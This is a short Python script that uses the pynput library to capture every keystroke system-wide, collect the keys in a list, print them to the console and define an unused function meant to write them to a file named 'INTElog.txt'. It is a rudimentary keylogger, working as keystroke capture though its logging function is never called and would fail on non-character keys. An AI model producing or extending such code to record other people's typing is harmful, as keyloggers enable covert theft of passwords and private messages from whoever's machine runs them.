import pynput
from pynput.keyboard import Key, Listener

keys = []
count = 0


def press(key):
    global keys, count

    if key != Key.space:
        keys.append(key)
    else:
        keys.append(" ")
    count = count + 1
    print(count)
    if count == 10:
        print(keys)
        count = 0
    print("Key pressed {}".format(key))


def release(key):
    print(keys)


def writer(log):
    with open("INTElog.txt", "w") as file:
        for k in log:
            file.write(k)


with Listener(on_press=press, on_release=release) as listener:
    listener.join()
